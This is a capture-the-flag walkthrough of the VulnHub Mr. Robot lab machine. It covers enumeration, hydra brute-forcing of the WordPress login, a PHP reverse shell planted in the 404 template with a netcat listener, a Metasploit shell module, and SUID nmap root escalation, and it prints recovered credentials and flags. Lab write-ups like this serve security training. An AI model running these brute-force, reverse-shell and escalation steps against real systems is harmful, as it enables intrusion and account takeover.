Project 1.0


Overview

The Mr. Robot vulnerable machine has three keys hidden in different locations. The goal is to find all three. Each key is progressively difficult to find.

github.com/besoben/project01 has a .docx file which contains screen shots of every step. Please enjoy.


Operating Systems used:

Kali Linux

https://www.kali.org/get-kali/

Mr. Robot:1 VulnHub

https://www.vulnhub.com/entry/mr-robot-1,151/


Tools/Commands used:

nmap - version 7.93

Nmap is a network scanner created by Gordon Lyon. Nmap is used to discover hosts and services on a computer network by sending packets and analyzing     the responses. Nmap provides a number of features for probing computer networks, including host discovery and service and operating system detection


nikto -version 2.1.6

Nikto is a free software command-line vulnerability scanner that scans webservers for dangerous files/CGIs, outdated server software and other           problems. It performs generic and server type specific checks. It also captures and prints any cookies received

gobuster

Gobuster is a tool used to brute-force:  URIs (directories and files) in web sites,  DNS subdomains (with wildcard support), Virtual Host names on       target web servers, Open Amazon S3 buckets, Open Google Cloud buckets, TFTP servers..

dirbuster - version OWASP DirBuster 1.0-RC1

DirBuster is a multi threaded java application designed to brute force directories and files names on web/application servers. Often is the case now     of what looks like a web server in a state of default installation is actually not, and has pages and applications hidden within. DirBuster attempts     to find these.

wpscan - version 3.8.22

The WPScan CLI tool is a free, for non-commercial use, black box WordPress security scanner written for security professionals and blog maintainers to   test the security of their sites. The WPScan CLI tool uses a database of 38,431 WordPress vulnerabilities.

metasploit - version 6.2.36

The Metasploit Project is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS   signature development. It is owned by Boston, Massachusetts-based security company Rapid7

burpsuite - version 2022.12.5

Burp Suite is an integrated platform and graphical tool for performing security testing of web applications, it supports the entire testing         process, from initial mapping and analysis of an application's attack surface, through to finding and exploiting security vulnerabilities.

hydra - version 9.4

Hydra is a pre-installed tool in Kali Linux used to brute-force usernames and passwords to different services such as FTP, ssh, telnet, MS SQL,         etc. Brute force can be used to try different usernames and passwords against a target to identify the correct credentials.

net cat - version 1.10-47

The Netcat ( nc ) command is a command-line utility for reading and writing data between two computer networks The communication happens using           either TCP or UDP. The command differs depending on the system ( netcat , nc , ncat , and others).
	

Walk through:

Footprinting and enumeration:

		whoami 

notes user

		ip address 

notes system ip

		sudo -i

super user/ root interactive

		nmap -O [ipadress/range]

scans range of ip addresses and lists operating system 

		arping -h [ipaddress/range]

this pings the arp network to map local network

		nikto -h [target-ipaddress]

vulnerbility scanner, set host [ip]

		gobuster dir -u [target-url/ipaddress] -w [/usr/share/wordlist/dirbuster/directory-list.2.3-small.txt]

dictionary attack, against url searching for hidden directories


DirBuster application w report generation
target url, wordlist, don't be recursive (unneeded in this), File extension "php, txt"


Physically explored the website, url input, triggered 404, accessed wp-login, robots.


FIRST FLAG FOUND, [target-ipaddress/robots] > [target0ipaddress/flag-1-of-3.txt] and [target-ipaddress/fsocity.dic]

download [fsocity.dic]

		cat head [fsocity.dic]

to see what the first few lines of text were

		wc [fsocity.dic]

word count, it's huge [that's what she said]

		cat [fsocity.dic] | sort -U  > [sorted_fsocity.dic]  

sorts all unique into a seperate file

		wc [sorted_fsocity.dic]

word count, significantly lower

		wpscan [target-ipaddress]

find information partaining to word press

Burp Suite
used integrated browser proxy, intercepted the login action on the wp-login page.
shows that it's a post form(top), log=username and pwd=password(bottom)

Brute force for username and password: 

		hydra -L [sorted_fsocity.dic] -p unkown [target-ipaddress] http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-sumbit=Log+In:F=Invalid Username
	
-L list file upload

-p unkown sets the password as uknown 

http-post-form, because it shown on burp as a post form

/wp-login.php, post form location

log and pass set as -L and -p, log and pass can be found on the burp 

interception as being identifiers

F=Invalid Username sets fail point that is referenced in the error message when a wrong username is entered


USERNAME IS ELLIOT


Option 1:

		hydra -l elliot -P [sorted_fsociety.dic]  [target-ipaddress] http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-sumbit=Log+In:F=is incorrect'

-l elliot, lower case to indicate exact user

-P password file

http-post-form, because it shown on burp as a post form

/wp-login.php, post form location

log and pass set as -L and -p, log and pass can be found on the burp 

interception as being identifiers

F=is incorrect sets fail point that is referenced in the error message when a wrong password is entered	


Option 2:

		wpscan -u elliot -P [sorted_fsociet.dic]

-u sets user as elliot, and -P sets password lists. syntax is easier, but enumeration on user id's is limited, so you must have a user id if unique user. It will check against admin etc. wpscan


[wp-username] = elliot 
[wp-pasword] = ER28-0652


Now we can log into wordpress. 


Forward Facing Application Leverage and generate damion shell:

Option #1

Log into wordpress application

Applications>edit>Edit 404 page template

Reverse Shell on the 404 page

php reverse shell code: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

php reverse shell, changed [attacker-ipaddress]/[port]

		nc -lvnp 443

net cat -listen, verbose, skip dns lookup, port [port]

Go back to the website, and place an incorrect url to trigger the 404 page, which in turns activates the reverse shell. 

WE ARE IN THE TERMINAL 

now in bin/sh$

Option #2

metasploit
		msfconsole
		
		search wordpress shell
		
		use 1
		
		show options
		
		set username [wp-username]
		
		set password  [wp-password]
		
		set rhost [targetip]
		
		exploit

ERROR
		
		advanced options
	
		set wpcheck false
		
		exploit
		
		shell 

gain terminal access

		whoami
		
		pwd
		
		ls
		
		cd /home 
		
		ls
		
		cd /robot
		
		ls


SECOND FLAG FOUND [flag]/ username:[password ] but it's md5 encrypted
	
cracked hash website (crack station) has it cracked and listed as [abcdefghijklmnopqestuvwxyz]

switch to robot user

		su robot

you get an error stating you need to be in a terminal


Lateral Movement, New Shell, New User Owned:

		python -c 'import pty;pty.spawn("/bin/bash")'

spawns a terminal

		su robot
		
with the password [abcdefghijklmnopqestuvwxyz]

		cd /robots
		
		ls
		
		cat key-2-of-3.txt = 822c73956184f694993bede3eb39f959
		
		find / -perm -4000 -type f 2>/dev/null

finds files that being ran by their owner

		nmap --version

research time -- it's vulnerable! 

Root escallation: 


		nmap --interactive

		nmap !sudo /bin/bash

		exit

		nmap !sh

		cd /root

		ls

		cat key-3-of-3.txt

04787ddef27c3dee1ee161b21670b4e4
